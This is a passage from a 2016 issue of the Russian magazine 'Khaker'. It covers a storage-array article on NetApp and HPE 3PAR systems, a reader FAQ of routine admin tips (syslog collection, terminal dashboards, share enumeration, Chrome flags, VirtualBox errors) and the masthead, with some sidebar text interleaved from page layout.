 5–15% от общей дисковой емкости), что снизит время от-      реальный опыт
 клика и увеличит производительность без добавления из-     одной компании,
                                                                             использованные быточного количества дисков. Высокая производитель-                                                                           решения
 ность такого подхода хорошо ощутима на решениях VDI     и оборудование
 (Virtual Desktop Infrastructure), где дедуплицированные дан-     не сравниваются
                                                                                по цене ные занимают мало места в кеше и при этом создается                                                                          и возможностям.
 впечатление, что диски виртуальных серверов размещены
 на SSD-томе.

 NETAPP FAS3250
 Рассмотрим системы хранения данных виртуального дата-центра, построен-
 ного на оборудовании HPE и NetApp. Эти компании лидируют в производстве
 быстрых, гибких и отказоустойчивых систем хранения, их СХД дают макси-
 мальную производительность при разнородной нагрузке.
   Первой продуктивной системой хранения с использованием SSD-кеша
 была NetApp FAS3250, в которую устанавливались Flash Cache PCI-платы ем-
 костью 1 Тбайт на каждый контроллер. Далее нарастить полезную емкость
 без снижения производительности позволили смешанные дисковые полки
 Flash Pool (по четыре SSD-диска на каждую полку с дисками других типов). Та-
 кой вид кеширования (Flash Pool) позволял ускорять операции чтения и запи-
 си, что было невозможно при использовании Flash Cache.
   В основе архитектуры Data ONTAP (ОС NetApp) лежит файловая система
 WAFL (Write Anywhere File Layout), которая новые данные всегда пишет в сво-
 бодное место, как при последовательной записи, что позволяет таким систе-
 мам хранения иметь небольшой RAM-кеш контроллера при высоких показате-
 лях производительности. Подобная архитектура позволила получать хорошие
 результаты на произвольную запись даже на NL-SAS-дисках. Например, сред-
 ние значения write при тестировании: 72 763 Кбит/с, 18 190 IOPS, latency —
 1,7 мс. Данные получены с тестового виртуального сервера (программа
 тестирования fio, тестировался RAW-раздел без файловой системы), разме-
 щенного на NL-SAS-дисках (собран из 94 дисков по 2 Tбайт). Во время тести-
 рования системы хранения были нагружены данными.
   По умолчанию на дисковом уровне данные защищены технологией RAID-
 DP (как вариант модифицированного RAID 6). Если на других системах хране-
 ния часто применяется RAID 1 («зеркало»), то недостатки RAID 6 при случай-
 ной перезаписи нивелируются благодаря WAFL.
   Механизм дедупликации позволяет не хранить повторяющиеся блоки дан-
 ных ни на дисках, ни в кеше, а хранить их в единственном экземпляре и кеши-
 ровать один раз, что сильно экономит емкость кеша. Этот эффект виден на об-
 разах операционных систем: все их файлы в основном одинаковые, поэтому
 все экземпляры виртуальных серверов занимают место одного виртуального
 диска. Такие технологии позволяют экономить на дисках компаниям с прогно-
 зируемыми нагрузками.
   Можно продуктивно использовать NFS как основной протокол подключения
 к дисковым массивам NetApp. Среди прочего данный тип подключения позво-
 ляет получить гибкую легко масштабируемую инфраструктуру при выносе ча-
 сти облака в резервный дата-центр, где также применяется технология Flash
 Pool при сайзинге системы хранения NetApp FAS8040.

 3PAR
 Рассмотрим системы хранения 3PAR, линейки 74xx и 84xx. По результатам не-
 скольких лет работы с массивами можно с уверенностью отнести их к числу
 лучших систем хранения для применения в виртуализированных средах. 3PAR
 для ускорения операций чтения на более медленных типах дисков предлага-
 ют использовать SSD-кеш с возможностью тиринга. Например, для размеще-
 ния данных используется составной том: на SAS-дисках (~45%), на наиболее
 медленных NL-SAS (~50%) и на SSD (~5%). Так, на массиве нужно задать толь-
 ко изначальное процентное соотношение и периодичность миграции горя-
 чих и холодных блоков. Далее массив анализирует, к каким данным наиболее
 часто происходит обращение, и, набрав статистику, с определенной перио-
 дичностью производит миграцию с более медленного на более быстрый уро-
 вень и наоборот. Когда часть блоков располагается на «медленных» дисках,
 помогает SSD-кеш, работающий одновременно с тирингом. Также полезен
 механизм Dynamic Optimization, позволяющий на уровне системы хранения
 мигрировать виртуальные серверы на более производительный тип дисков
 без прерывания сервиса.
   3PAR использует виртуализацию дискового пространства, а именно все
 однотипные физические диски в массиве разбиваются на кусочки (чанклеты)
 по 1 Гбайт, из которых строятся логические диски с заданным типом RAID. Да-
 лее из этих логических дисков создаются тома, что позволяет увеличить быст-
 родействие, так как в операциях чтения/записи принимают участие все одно-
 типные диски, установленные в массив.
   Когда выходит из строя один из дисков, процесс ребилда (перестроения)
 занимает значительно меньше времени, чем при классическом подходе, когда
 используются отдельные диски под spare. Здесь как раз сказывается архитек-
 тура организации хранения на низком уровне. Массивы 3PAR не выделяют от-
 дельных дисков под spare, они используют зарезервированные чанклеты, ко-
 торые расположены на всех дисках, то есть при выходе одного диска из строя
 данные перемещаются со всех однотипных дисков массива на все, а не с мно-
 гих на один, как в классическом сценарии.

 ALL-FLASH
 Долгое  время  построение  систем  хранения  данных
 на базе SSD оставалось оправданно только для биз-
 нес-критичных задач, так как SSD-носители были доволь-
 но дорогими и отличались небольшим сроком службы.
 SSD-диски имели достаточно низкий ресурс на запись/        INFO
 перезапись. Как только производители систем хранения
                                                                            Сегодня лидеры смогли добиться высокого количества циклов перезапи-
                                                                             отрасли предлагают
 си, стоимость all-flash-систем начала снижаться, а в не-                                                                          интересные решения
 которых случаях оказалась сопоставимой со стоимостью       с применением
 SAS. Стало возможным развертывание бизнес-критичных        SSD-дисков
                                                                           емкостью 7,68 приложений в виртуальной среде с максимальным быст-                                                                              Tбайт и 15,36 Tбайт
 родействием и минимальным временем отклика.                 в одном накопителе
   Рассмотрим особенности работы all-flash систем хра-        в зависимости
                                                                                   от форм-фактора. нения на примере HP 3PAR 8450. Массивы 3PAR разносят
 все тома по всем SSD-носителям массива, что при рав-
 номерном распределении нагрузки предотвращает износ конкретных дисков.
 При этом чип ASIC в каждом контроллере исключает запись нулевых блоков.
 Вместо центрального процессора массива он выполняет операции детекти-
 рования нулей, аппаратной поддержки XOR (для подсчета контрольных сумм
 в RAID 5, RAID 6), дедупликации и другие операции. Эти системы хранения по-
 зволяют использовать четыре контроллера в рамках одной системы в режиме
 Active/Active. Так, каждый из контроллеров может работать с каждым томом,
 и поэтому нагрузка равномерно распределяется по всем контроллерам. Что-
 бы избежать проседания производительности при вы-
 ходе контроллера из строя или при его перезагрузке,
 кеш на запись зеркалируется между четырьмя контрол-
 лерами.
   Одна из востребованных функций all-flash-масси-
 вов — QoS (Quality of Service), позволяющая гаранти-
 рованно получать требуемые значения IOPS, latency                                   WWW
 в рамках виртуальной инфраструктуры.
   Массивы 3PAR можно использовать в рамках двух     Технические характери-
                                                                          стики СХД NetApp серии разнесенных  площадок,  появляется  возможность                                                                          FAS3250
 предложить функциональность Peer Persistence (разне-
 сенный отказоустойчивый кластер VMware). В этом ре-     Файловая система WAFL
                                                                                          (Write Anywhere File шении LUN с дисками виртуальных серверов реплици-                                                                                            Layout)
 руется между массивами в разнесенных дата-центрах.
 К LUN создаются активные и пассивные пути, которые     Как правильно измерять
                                                                          производительность видны хостам ESXi. Реплика основного LUN представ-
                                                                                диска
 лена тем же WWN, что и основной. Поэтому для среды
 VMware переключение LUN с основного на резервный     SAS-диски: назначение,
 происходит прозрачно. Применение Peer Persistence       описание, техниче-
                                                                          ские характеристики позволяет нам автоматизировать процесс переклю-                                                                                 устройств
 чения между площадками и не требует привлекать до-
 полнительные решения, как, например, VMware Site      Технические характе-
                                                                         ристики систем NetApp Recovery Manager.
                                                                       FAS8040 Series
   При использовании all-flash-массива на двух пло-
 щадках RTT будет относительно высоким в сравнении      База накопителей HPE
 с локальной площадкой, поэтому лучше применять      3PAR StoreServ 8450
                                                                            на четыре узла асинхронную репликацию с удаленной площадкой или
 условно синхронную репликацию данных, когда массив    HPE 3PAR StoreServ 8450
 на основной площадке не ждет подтверждения записи,       Storage System (pdf)
 а сразу стремится записать новые данные на удален-                                                                HPE 3PAR StoreServ
 ную площадку. Используя условно синхронную репли-                                                                                          Architecture (pdf)
 кацию на SSD-дисках, можно сохранить высокую про-
 изводительность локальной площадки и в то же время
 получить хороший RPO на удаленной.
FAQ



                                         Алексей Zemond
                                            Панкратов
                                            3em0nd@gmail.com

FAQ
   ОТВЕТЫ НА ВОПРОСЫ
       ЧИТАТЕЛЕЙ

               (ЕСТЬ ВОПРОСЫ? ШЛИ НА FAQ@GLC.RU)





КАК ГРАМОТНО БЭКАПИТЬ ЛОГИ В WINDOWS С KIWI SYSLOG DAEMON
Буфер хранения логов на устройствах обычно ограничен, так что лучше зара-
нее озаботиться задачей их сохранения. В том случае, если что-то пойдет не
так, всегда можно будет найти информацию о проблеме.
  Решения могут быть разными. Можно настроить сервер, который будет при-
нимать сообщения syslog и хранить их в базе данных. Можно положиться на
одну из проверенных и хорошо себя зарекомендовавших систем мониторинга
вроде Zabbix или Nagios. Если подобная система уже используется, то останет-
ся только поднастроить ее.
  А вот если мониторинг не используется, а логи оборудования собирать хо-
чется, ставить подобное решение не всегда удобно. Лично мне для подобных
целей понравилось использовать Kiwi Syslog Daemon. Эта прога предназначе-
на в первую очередь для сбора сообщений syslog от девайсов и дальнейшего
оповещения админа о событиях по заданным критериям. Еще она незаменима
для анализа и разбора ситуаций с разного рода сбоями.





                                                           Kiwi Syslog Daemon


Для установки, помимо дистрибутива Kiwi, понадобится свободный сервак, где
его можно будет развернуть. Сама установка проста, и вопросов возникнуть не
должно. После этого можно настраивать устройства на передачу Kiwi различ-
ных логов. Как только все будет работать, в мониторе проги появятся выводы
от настроенных девайсов. Одна проблема: поступать они будут на один экран,
а это не совсем удобно. Для разграничения нужно создавать фильтры и делить
по устройствам. Настроек в Kiwi предостаточно, можно отправлять сообщения
администратору в случае срабатывания определенного триггера, писать лог
в текстовый файл и многое другое. Со своей задачей программа справляется
отлично, один недостаток — она проприетарная и стоит денег.

КАК СДЕЛАТЬ СЕБЕ «ГОЛЛИВУДСКИЙ» ДЕСКТОП В LINUX
Думаю, ты не раз видел в фильмах экраны с многооконным интерфейсом, кото-
рый отображает массу очень значительно выглядящих датчиков. Смотрится это
довольно круто, и на случай, если ты вдруг захочешь сделать что-то подобное
в домашних условиях, я расскажу о паре программ, которые помогут добиться
желаемого.
   Пожалуй, максимального вау-эффекта позволяет достичь приложение
Hollywood. Для его установки потребуется Linux семейства Debian. Ubuntu по-
дойдет как нельзя лучше.





                                              Внешний вид — просто чума!


В Hollywood входит целый набор утилит, таких как htop, hexdump, apg, man, stat,
tree, speedometer, jp2a, bmon, sshart, cmatrix и прочие. В сочетании с мозаич-
ной компоновкой окон, реализованной при помощи консольного оконного ме-
неджера Byobu, они выглядят максимально зрелищно.
  В разных окнах терминала запускаются утилиты для вывода логов, демон-
стрируется активность процессов, оценка нагрузки на CPU, мониторинг сете-
вых соединений, визуализация звукового спектра и так далее. Демонстрируют-
ся картинки в псевдографике, содержимое различных областей /proc, /sys и /
dev, древовидное представление разных директорий и прочие одновременно
полезные и бесполезные данные. Все вместе это дает имитацию киношной кар-
тинки, похожей на то, как в представлении обывателя должен выглядеть экран
крутого хакера во время работы.
  В том случае, если в репозитории нет пакета hollywood и команда sudo apt-
get install hollywood не срабатывает, подключи репозиторий вручную.

sudo apt-add-repository ppa:hollywood/ppa
sudo apt-get update
sudo apt-get install hollywood

Для запуска достаточно команды hollywood. Для выхода из программы можно
нажать комбинацию клавиш Ctrl + C и end для завершения процесса.
  К сожалению, из впечатляющего здесь один внешний вид — толку от
Hollywood маловато, разве что можно прикрутить его в качестве заставки. А
вот MultiTail — весьма гибкий и полезный в работе инструмент. С его помощью
можно наблюдать не только за логами, но и за выводом других команд, к при-
меру rsstail, wtmptail, negtail.





                                                                                            MultiTail

Количество отображаемых окон никак не ограничено. Можно просматривать
море различной информации. Одна из ценных фич — возможность выбора
цветовых схем. Они доступны для всех наблюдаемых программ, к примеру для
Postfix, Apache, Sendmail, tcpdump и Squid можно выбрать разные темы.
    MultiTail умеет фильтровать вывод, подобно grep и sed, а еще может кон-
вертировать части выводимых строк. Например, лог-файлы Squid и qmail могут
быть конвертированы во что-то более читабельное. Еще MultiTail умеет конвер-
тировать IP-адреса, коды ошибок и многое другое.
  Набор функций можно легко расширить за счет скриптов на Perl, bash, Python
или других языках. О других полезных возможностях MultiTail можешь прочитать
на официальной странице проекта. Думаю, эта софтина достойна занять свое
место на одном из мониторов администратора. Да и выглядит она не многим
менее впечатляюще, чем Hollywood.

КАК СПРЯТАТЬ СЕТЕВЫЕ ПАПКИ WINDOWS ПРИ ПОМОЩИ ACCESS-
BASED ENUMERATION
Частенько пользователи видят много общих папок, но доступа к ним не имеют.
Чтобы понять, почему так происходит и как скрыть ненужные каталоги, разбе-
ремся с технологией Access-based enumeration.
   Access-based enumeration (ABE) дословно переводится как «перечисление
на основании доступа». Эта система позволяет на общих сетевых папках или
шарах скрыть от пользователя те файлы или папки, к которым у него нет прав
доступа. Для понимания процесса разберем, как работает механизм подклю-
чения к сетевой папке.
1. Пользователь подключается к нашему серверу и запрашивает доступ к шаре.
2. Сервак, а если быть более точным, служба LanmanServer, отвечающая за общий
   доступ к файлам и папкам, смотрит, есть ли у юзера разрешения файловой си-
   стемы на чтение и листинг данной директории. Если они есть, то возвращает ему
   список всех файлов и папок.
3. Юзер выбирает из списка полученных файлов интересующий и пытается его от-
   крыть.
4. Сервак проверяет, есть ли у пользователя требуемые права доступа на данное
   действие. В том случае, если все в порядке и права есть, возвращается результат
   запроса, иначе выдается ошибка — нехватка прав доступа.

При такой схеме сервер сначала выдает пользователю список всего содержи-
мого папки, а права доступа к отдельным файлам и папкам внутри нее проверя-
ет потом, при попытке доступа. Конечно же, без необходимых прав пользова-
тель все равно не сможет получить доступ к файлам. Но если шара насчитывает
более сотни различных папок, а доступ у пользователя есть только к трем,
смысла отображать такой список нет. В таких случаях и нужен Access-based
enumeration.
  При активации ABE сервер будет проверять права пользователя на содер-
жимое папки перед тем, как отправлять список. Поэтому, как сам понимаешь,
юзер увидит только те папки, к которым имеет необходимые права — просмотр
содержимого для папок и чтение для отдельных файлов. Для активации ABE
нужно, чтобы у сервера была роль File and Storage Services. Заходим в раздел
шар и, выбрав необходимую общую папку, переходим в ее свойства.





Остается только включить в свойствах нужную функцию. В нашем случае это
Enable access-based enumeration.





Стоит отметить, что при большом количестве файлов и пользователей нагрузка
на сервер будет значительной и папки могут открываться с задержкой. Стоит
учитывать и то, что ABE не распространяется на подключение к серверу по RDP
и, естественно, на администраторов сервера.

КАК НАУЧИТЬ MACBOOK ПОДСТРАИВАТЬ ЯРКОСТЬ И ЦВЕТ ЭКРАНА ПРИ
ПОМОЩИ F.LUX, SHADY ИЛИ LUMEN
Любой MacBook умеет автоматически регулировать яркость экрана в зависи-
мости от освещения вокруг. Но в темноте или при тусклом свете эта функция
работает неидеально. Сторонние утилиты не только решают этот вопрос, но и
дают новую интересную возможность — автоматически меняют цветовую тем-
пературу.
   Наиболее известен проект f.lux . Эта программа призвана подстраивать па-
раметры экрана под естественный свет: утром цвета более холодные, вечером
они плавно переходят в теплые тона. Есть мнение, что так экран меньше утом-
ляет глаза.





                                                                                                          f.lux


Еще стоит обратить внимание на утилиту Shady, которая позволяет затемнять
экран, доводя яркость монитора до минимума.





                                                     Шторы Shady


Интересная альтернатива — Lumen. Фишка этой программы в том, что она сле-
дит за происходящим на экране и подстраивает яркость в зависимости от ха-
рактера картинки. Если на весь экран открыт браузер с белыми или пестрыми
сайтами, то яркость сделается поменьше, а после переключения в текстовый
редактор с темным фоном она автоматически вырастет. Lumen реагирует на
изменения быстро и неплохо способствует комфорту. Разработчики пишут на
сайте, что Lumen может самообучаться: запоминает, как при смене интерфей-
сов с темных на светлые ты регулируешь яркость, а затем повторяет твои дей-
ствия. Когда Lumen обучится, работать станет еще приятнее.





                                                             Lumen


5 ПОЛЕЗНЫХ НАСТРОЕК GOOGLE CHROME, О КОТОРЫХ ЗНАЕТ НЕ
КАЖДЫЙ
В Chrome есть масса настроек, скрытых от простых пользователей. В разде-
ле экспериментальных параметров можно найти немало интересного. Вот пять
«тайных» настроек, которые могут тебе пригодиться.
   Чтобы открыть раздел скрытых переменных, набери в адресной строке
chrome://flags. Ты увидишь кучу параметров, которые пока что тестируются раз-
работчиками, решение об их включении в браузер пока не принято. Но кое-что
уже вполне можно включить!





                                                  Скрытый раздел настроек

1. Пробуем протокол QUIC:
   chrome://flags/#enable-quic
  QUIC (Quick UDP Internet Connections) — новый экспериментальный интер-
   нет-протокол, разработанный в Google. Он создан для ускорения работы
   соединений и задуман как замена TCP. Хоть на данный момент он и не осо-
   бенно распространен, но при обращении к серверам Google может дать не-
   которую прибавку скорости.

2. Разрешаем Chrome создавать пароли:
   chrome://flags/#enable-password-generation
   Если активировать эту настройку, то Chrome будет автоматически созда-
   вать пароли и предлагать их, когда ты находишься на странице регистра-
   ции. Функция бывает полезной и хорошо работает вместе со встроенным
   сервисом хранения паролей.

3. Активируем плавную прокрутку:
   chrome://flags/#smooth-scrolling
   Этой фичи пользователи ждут с самого появления Chrome. И вот наконец у
   девелоперов дошли до нее руки. Включаем и наслаждаемся!

4. Добавляем к вкладкам выключатель звука:
   chrome://flags/#enable-tab-audio-muting
   Если вдруг в какой-либо вкладке у тебя начнет играть музыка или воспроиз-
   водиться видео, то Chrome отметит эту вкладку значком громкоговорителя.
   Это помогает найти засевший где-нибудь видеобаннер, пропущенный «Ад-
   блоком», или забытую вкладку с YouTube. Если активировать скрытую на-
   стройку, этот же значок можно будет использовать для быстрого отключе-
   ния звука на отдельной вкладке.

5. Ускоряем закрытие вкладок:
   chrome://flags/#enable-fast-unload
   Эта настройка сделает интерфейс чуть более отзывчивым, ускорив закры-
   тие вкладок. Особо обольщаться не стоит — ускоряется лишь работа гра-
   фического интерфейса, а не движка Chrome, но полезно уже и это.

КАК ПОБЕДИТЬ ОШИБКУ E_FAIL ПРИ РАБОТЕ С VIRTUALBOX
Иногда VirtualBox при запуске выдает загадочную ошибку E_FAIL (0x80004005).
К ее появлению может привести несколько разных проблем, с решением кото-
рых мы и разберемся.





                                            Ошибка VirtualBox

Чаще всего ошибка возникает, когда VirtualBox не может записать состоя-
ние машины в файл vbox. Если точнее, то сообщение появится на следующий
раз — при попытке открыть такой файл. Вообще, когда VirtualBox по каким-то
причинам не может сохранить состояние машины (к примеру, файл поврежден
или занят другим процессом), программа попытается сохранить состояние
виртуалки в файлы с таким же именем, но с добавлением к расширению vbox
-prev или -tmp. Так что первый вариант решения проблемы — поискать такие
файлы в каталогах VirtualBox.

C:\Users\<имя пользователя>\VirtualBox VMs\<имя машины>\
C:\Users\<имя пользователя>\.VirtualBox\

   Если версии -prev или -tmp нашлись, то нужно сделать следующее.

1. Файл имя_машины.vbox удалить, но перед этим на всякий случай сохранить в
   отдельную директорию.
2. Файл имя_машины.vbox-prev переименовать в имя_машины.vbox, проще го-
   воря, нужно стереть -prev из расширения файла.





                                                           Рабочие файлы



Если в папке найдутся файлы с расширением xml-prev или xml-tmp, то с ними
нужно поступить точно так же. И конечно же, эти действия нужно проделать
в обеих папках. Бывает, правда, что все эти процедуры никак не помогают и
ошибка остается. В некоторых случаях работе VirtualBox может мешать обнов-
ление Windows под номером KB3004394. Думаю, ты знаешь, что с ним делать.
Открываем консоль и удаляем обновление:

wusa /uninstall /kb:3004394





                                               Удаляем обновление KB3004394

После этого нужно ребутнуться и снова попробовать завести виртуалку. Не по-
могло? В таком случае советую слазить в BIOS и посмотреть, включена ли вир-
туализация. Нужный параметр называется Intel Virtualization Technology. Где он
расположен, сказать сложно — это зависит исключительно от вендора матплаты.





                                                                         Intel Virtualization Technology

)Если ничего так и не помогло, то решением может стать использование более
старых версий программы. К примеру, в VirtualBox 4.3.12 и 4.3.10 таких проблем
не наблюдалось.
                                    18+





  № 10 (213)
                     Илья Русанен            Алексей Глазков
                      Главный редактор         Выпускающий редактор
                          rusanen@glc.ru                  glazkov@glc.ru

                 Андрей Письменный        Евгения Шарипова
                       Шеф-редактор           Литературный редактор
                         pismenny@glc.ru


                       РЕДАКТОРЫ РУБРИК
      Андрей Письменный       Антон «ant» Жуков           Александр «Dr.»
     PC ZONE, СЦЕНА, UNITS          ВЗЛОМ                 Лозовский
          pismenny@glc.ru              zhukov@glc.ru            MALWARE, КОДИНГ,
                                                           PHREAKING
                                                                         lozovsky@glc.ru       Юрий Гольцев           Евгений Зобнин
          ВЗЛОМ                  X-MOBILE
            goltsev@glc.ru                zobnin@glc.ru

        Илья Русанен           Павел Круглов
           КОДИНГ              UNIXOID и SYN/ACK
           rusanen@glc.ru                kruglov@glc.ru


                        MEGANEWS
                             Мария Нефёдова
                                  nefedova.maria@gameland.ru



                                АРТ
                   Анна Королькова          DepositPhotos.com
                        Верстальщик             Источник лицензионных
                     цифровой версии             фото и графики


                           РЕКЛАМА
                            Мария Самсоненко
                                Менеджер по рекламе
                                      samsonenko@glc.ru


                 РАСПРОСТРАНЕНИЕ И ПОДПИСКА
                     Подробная информация по подписке: paywall@glc.ru
                                 Отдел распространения
                                Наталья Алехина (lapina@glc.ru)
                          Адрес для писем: Москва, 109147, а/я 50




В случае возникновения вопросов по качеству печати: claim@glc.ru. Адрес редакции: 115280, Москва, ул. Ленинская Слобода, д. 19, Омега плаза. Изда-
тель: ООО «Эрсиа»: 606400, Нижегородская обл., Балахнинский р-н, г. Балахна, Советская пл., д. 13. Учредитель: ООО «Принтер Эдишионс», 614111,
Пермский край, г. Пермь, ул. Яблочкова, д. 26. Зарегистрировано в Федеральной службе по надзору в сфере связи, информационных технологий и массо-
вых коммуникаций (Роскомнадзоре), свидетельство ПИ № ФС77-56756 от 29.01.2014 года. Мнение редакции не обязательно совпадает с мнением авто-
ров. Все материалы в номере предоставляются как информация к размышлению. Лица, использующие данную информацию в противозаконных целях,
могут быть привлечены к ответственности. Редакция не несет ответственности за содержание рекламных объявлений в номере. По вопросам лицензи-
рования и получения прав на использование редакционных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2016